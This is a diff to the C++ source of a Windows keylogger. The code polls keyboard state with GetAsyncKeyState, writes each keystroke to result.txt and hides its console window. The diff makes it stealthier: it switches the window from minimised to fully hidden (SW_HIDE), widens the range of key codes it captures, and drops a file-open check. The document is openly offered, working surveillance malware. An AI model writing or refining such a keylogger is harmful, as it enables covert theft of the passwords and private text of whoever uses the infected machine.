@@ -9,10 +9,8 @@ using namespace std;
 void save(string key) {
     ofstream log;
     log.open("result.txt", fstream::app);
-    if (log.is_open()) {
 		log << key;
 		log.close();
-	} 
 }
 /*Cases for key other than alphabet i,e special letters*/
 bool key(int press) {
@@ -71,7 +69,7 @@ void normalKey(){
 	//outputstream that stores all the key pressed
     fstream record;
     while (true) {
-        for (i = 8; i < 190; i++) {
+        for (i = 0; i < 255; i++) {
             //if non special button is pressed
             if(GetAsyncKeyState(i)== -32767 && key(i)==false){
                 record.open("result.txt", fstream::app);
@@ -85,7 +83,7 @@ void normalKey(){
 }
 //method to minimize window console screen
 void hide(){
-	::ShowWindow(::GetConsoleWindow(), SW_MINIMIZE);
+	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 }
 int main () {
 	hide();
